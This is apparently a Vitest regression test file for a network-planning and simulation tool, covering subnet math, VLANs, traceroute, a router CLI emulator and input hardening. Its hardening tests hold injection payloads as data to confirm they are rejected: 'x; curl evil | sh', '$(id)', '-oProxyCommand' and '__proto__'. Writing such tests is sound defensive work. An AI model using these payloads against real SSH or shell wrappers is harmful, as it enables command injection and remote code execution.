// Regression tests for the 2026-11 audit fixes (plus control cases).
import { describe, it, expect } from 'vitest';
import { createRequire } from 'node:module';
import { ipInCidr, parseCidr, subnetUsage } from '../files/src/network.js';
import { buildNet, ping, traceroute } from '../files/src/sim.js';
import { compileTopology } from '../files/src/simCompile.js';
import { newConfig, makeSession } from '../files/src/cli.js';
import { sampleFloorCoverage, coveredThroughWalls } from '../files/src/geometry.js';
import { bestAp } from '../files/src/wireless.js';
import { resolve } from '../files/src/dns.js';
import { encryptObject, decryptObject } from '../files/src/crypto.js';
import { sshTarget, sshTargetIsSafe } from '../files/src/sshConnect.js';
import { describeEvent, summarizePing } from '../files/src/simUI.js';

const require = createRequire(import.meta.url);
const { buildSshArgv } = require('../electron/sshArgv.cjs');

describe('subnet math above 128.0.0.0', () => {
  it('keeps the network unsigned', () => {
    expect(parseCidr('192.168.1.0/24').net).toBe(0xc0a80100);
    expect(parseCidr('255.255.255.0/24').net).toBeGreaterThan(0);
  });
  it('matches hosts in 192.168/16, 172.16/12 and 10/8 alike', () => {
    expect(ipInCidr('192.168.1.5', '192.168.1.0/24')).toBe(true);
    expect(ipInCidr('192.168.2.5', '192.168.1.0/24')).toBe(false);
    expect(ipInCidr('172.16.0.5', '172.16.0.0/24')).toBe(true);
    expect(ipInCidr('10.0.10.5', '10.0.10.0/24')).toBe(true);
  });
  it('counts usage in a 192.168 subnet', () => {
    expect(subnetUsage('192.168.1.0/29', ['192.168.1.2', '192.168.1.3', '10.0.0.2'])).toEqual({ used: 2, capacity: 5, pct: 40 });
  });
});

describe('trunks carry VLANs that have no subnet', () => {
  const project = () => ({
    settings: { vlans: [{ id: '30', name: 'cams' }] },
    floors: [{ id: 'f',
      SWS: [{ id: 's1', name: 'S1' }, { id: 's2', name: 'S2', uplinkId: 's1' }],
      APS: [{ id: 'a1', name: 'A1', swId: 's1', port: 1, vlan: '30', ip: '10.0.30.2' }],
      CAMS: [{ id: 'c1', name: 'C1', swId: 's2', port: 1, vlan: '30', ip: '10.0.30.3' }] }],
  });
  it('same-VLAN hosts on two switches reach each other', () => {
    expect(ping(compileTopology(project()).net, { from: 'h:a1', to: '10.0.30.3' }).status).toBe('delivered');
  });
  it('also when the VLAN is not in the registry at all', () => {
    const p = project(); p.settings.vlans = [];
    expect(ping(compileTopology(p).net, { from: 'h:a1', to: '10.0.30.3' }).status).toBe('delivered');
  });
  it('still isolates different VLANs', () => {
    const p = project(); p.floors[0].CAMS[0].vlan = '40';
    expect(ping(compileTopology(p).net, { from: 'h:a1', to: '10.0.30.3' }).ok).toBe(false);
  });
});

describe('traceroute', () => {
  const spec = (acls = []) => ({
    devices: [
      { id: 'h1', kind: 'host', ifaces: [{ name: 'e', ip: '10.0.1.2', prefix: 24 }], gateway: '10.0.1.1' },
      { id: 'r', kind: 'router', acls, ifaces: [{ name: 'a', ip: '10.0.1.1', prefix: 24 }, { name: 'b', ip: '10.0.2.1', prefix: 24 }] },
      { id: 'h2', kind: 'host', ifaces: [{ name: 'e', ip: '10.0.2.2', prefix: 24 }], gateway: '10.0.2.1' },
    ],
    links: [['h1/e', 'r/a'], ['r/b', 'h2/e']],
  });
  it('is filtered by an ICMP ACL exactly like ping', () => {
    const deny = [{ action: 'deny', proto: 'icmp', src: 'any', dst: 'any' }];
    expect(ping(buildNet(spec(deny)), { from: 'h1', to: '10.0.2.2' }).status).toBe('filtered');
    expect(traceroute(buildNet(spec(deny)), { from: 'h1', to: '10.0.2.2' })).toEqual([{ ttl: 1, ip: null, reached: false }]);
  });
  it('walks host → router → host', () => {
    expect(traceroute(buildNet(spec()), { from: 'h1', to: '10.0.2.2' })).toEqual([
      { ttl: 1, ip: '10.0.1.1', reached: false },
      { ttl: 2, ip: '10.0.2.2', reached: true },
    ]);
  });
  it('does not list the originating router as its own first hop', () => {
    expect(traceroute(buildNet(spec()), { from: 'r', to: '10.0.2.2' })).toEqual([{ ttl: 1, ip: '10.0.2.2', reached: true }]);
  });
  it('rejects a bad source or destination with a clear error', () => {
    expect(() => traceroute(buildNet(spec()), { from: 'nope', to: '10.0.2.2' })).toThrow(/no such device/);
    expect(() => traceroute(buildNet(spec()), { from: 'h1', to: 'x' })).toThrow(/bad destination/);
  });
});

describe('CLI engine', () => {
  const ios = (lines, cfg = newConfig({ hostname: 'R' })) => {
    const s = makeSession(cfg, 'cisco');
    const out = lines.map((l) => s.exec(l));
    return { cfg, out };
  };
  it('startup-config keeps RIP and NAT across reload', () => {
    const { cfg } = ios(['en', 'conf t', 'router rip', 'exit', 'ip nat inside source list 1 interface g0 overload', 'end', 'wr']);
    cfg.rip = null; cfg.natEnabled = false;
    makeSession(cfg, 'cisco').exec('reload');
    expect(cfg.rip && cfg.rip.enabled).toBe(true);
    expect(cfg.natEnabled).toBe(true);
  });
  it('reload drops RIP/NAT that were never saved', () => {
    const { cfg } = ios(['en', 'wr', 'conf t', 'router rip', 'end', 'reload']);
    expect(cfg.rip).toBeNull();
  });
  it('rejects interface names that alias Object.prototype', () => {
    const { out } = ios(['en', 'conf t', 'interface __proto__', 'interface constructor']);
    expect(out[2].error).toBe(true);
    expect(out[3].error).toBe(true);
    expect(({}).ip).toBeUndefined();
    const ros = makeSession(newConfig(), 'mikrotik');
    expect(ros.exec('/ip address add address=1.2.3.4/24 interface=__proto__').error).toBe(true);
    expect(({}).ip).toBeUndefined();
  });
  it('RouterOS rejects out-of-range prefixes and octets', () => {
    const ros = makeSession(newConfig(), 'mikrotik');
    expect(ros.exec('/ip address add address=1.2.3.4/99 interface=ether1').error).toBe(true);
    expect(ros.exec('/ip address add address=1.2.3.999/24 interface=ether1').error).toBe(true);
    expect(ros.exec('/ip route add dst-address=10.0.0.0/40 gateway=1.2.3.1').error).toBe(true);
    expect(ros.exec('/ip address add address=1.2.3.4/24 interface=ether1').error).toBeUndefined();
  });
  it('clamps VLAN ranges to 1-4094', () => {
    const { cfg } = ios(['en', 'conf t', 'interface g0/1', 'switchport trunk allowed vlan 4090-999999999,0,7']);
    expect(cfg.interfaces['g0/1'].allowed).toEqual([7, 4090, 4091, 4092, 4093, 4094]);
  });
});

describe('coverage honours directional antennas', () => {
  const arcOf = (ap) => (ap.pattern === 'sector-30' ? 15 : 180);
  it('a sector AP covers far less than an omni', () => {
    const omni = sampleFloorCoverage({ APS: [{ fx: 0.5, fy: 0.5, r: 300 }], WALLS: [] }, 600, 600, { arcOf });
    const sector = sampleFloorCoverage({ APS: [{ fx: 0.5, fy: 0.5, r: 300, pattern: 'sector-30', heading: 0 }], WALLS: [] }, 600, 600, { arcOf });
    expect(sector.covered).toBeLessThan(omni.covered / 4);
    expect(sector.covered).toBeGreaterThan(0);
  });
  it('point behind the antenna is not covered; omni default unchanged', () => {
    const ap = { fx: 0.5, fy: 0.5, r: 300 };
    expect(coveredThroughWalls(ap, 200, 300, 600, 600, [], 1, 15, 0)).toBe(false);
    expect(coveredThroughWalls(ap, 400, 300, 600, 600, [], 1, 15, 0)).toBe(true);
    expect(coveredThroughWalls(ap, 200, 300, 600, 600, [], 1)).toBe(true);
  });
  it('a client behind a sector antenna associates elsewhere', () => {
    const sector = { id: 's', fx: 0.5, fy: 0.5, r: 300, pattern: 'sector-30', heading: 0 };
    expect(bestAp({ fx: 0.3, fy: 0.5 }, [sector], [], 600, 600)).toBeNull();
    expect(bestAp({ fx: 0.7, fy: 0.5 }, [sector], [], 600, 600).ap.id).toBe('s');
  });
});

describe('untrusted-input hardening', () => {
  it('dns resolve ignores Object.prototype members', () => {
    expect(resolve({ 'ap-01': '10.0.0.2' }, 'constructor')).toBeNull();
    expect(resolve({ 'ap-01': '10.0.0.2' }, 'AP-01')).toBe('10.0.0.2');
  });
  it('vault rejects absurd KDF iteration counts', async () => {
    const blob = await encryptObject({ a: 1 }, 'pw');
    await expect(decryptObject({ ...blob, iter: 4e9 }, 'pw')).rejects.toThrow(/KDF/);
    await expect(decryptObject({ ...blob, iter: 0.5 }, 'pw')).rejects.toThrow(/KDF/);
    expect(await decryptObject(blob, 'pw')).toEqual({ a: 1 });
  });
  it('ssh user may not start with a dash (desktop validator)', () => {
    expect(buildSshArgv({ host: '192.0.2.1', user: '-oProxyCommand' }).ok).toBe(false);
    expect(buildSshArgv({ host: '192.0.2.1', user: 'admin+ct' })).toEqual({ ok: true, argv: ['ssh', 'admin+ct@192.0.2.1'] });
  });
  it('web clipboard fallback refuses shell metacharacters', () => {
    expect(sshTargetIsSafe(sshTarget({ ip: '192.0.2.1', creds: { user: 'admin', key: '~/.ssh/id' } }))).toBe(true);
    expect(sshTargetIsSafe(sshTarget({ creds: { host: 'x; curl evil | sh' } }))).toBe(false);
    expect(sshTargetIsSafe(sshTarget({ ip: '192.0.2.1', creds: { user: '-oFoo' } }))).toBe(false);
    expect(sshTargetIsSafe(sshTarget({ ip: '192.0.2.1', creds: { key: '$(id)' } }))).toBe(false);
  });
});

describe('sim panel wording', () => {
  it('describes firewall drops and filtered results in words', () => {
    expect(describeEvent({ kind: 'acl-drop', devName: 'R1', proto: 'icmp', dst: '10.0.2.2' })).toMatch(/blocked by a firewall/);
    expect(summarizePing({ ok: false, status: 'filtered', events: [] }).label).toMatch(/Filtered/);
  });
});
